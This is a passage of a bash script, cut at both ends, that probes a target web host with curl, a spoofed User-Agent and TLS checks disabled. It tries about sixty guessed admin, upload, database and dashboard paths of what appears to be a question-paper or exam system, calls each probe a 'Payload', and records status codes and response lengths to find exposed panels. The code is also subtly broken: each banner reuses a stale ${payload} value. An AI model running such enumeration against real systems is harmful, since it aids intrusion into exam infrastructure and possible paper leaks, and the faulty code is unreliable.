code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
